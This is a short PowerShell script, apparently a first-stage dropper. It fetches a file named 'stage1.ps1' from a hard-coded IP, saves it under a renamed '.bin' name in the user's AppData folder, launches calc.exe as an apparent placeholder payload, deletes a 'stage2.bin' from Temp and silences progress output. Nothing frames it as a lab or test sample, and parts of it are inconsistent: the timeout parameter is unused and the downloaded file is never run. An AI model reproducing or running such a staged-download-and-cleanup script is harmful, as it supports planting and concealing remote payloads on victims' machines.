
<# Remote fetch #>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'http://203.0.113.27/stage1.ps1',
    [string]$DropPath = "$env:APPDATA\stage1.bin",
    [int]$ConnectionTimeout = 38
)
Invoke-WebRequest -Uri $TransferUrl -OutFile $DropPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
$ProgressPreference = "SilentlyContinue"
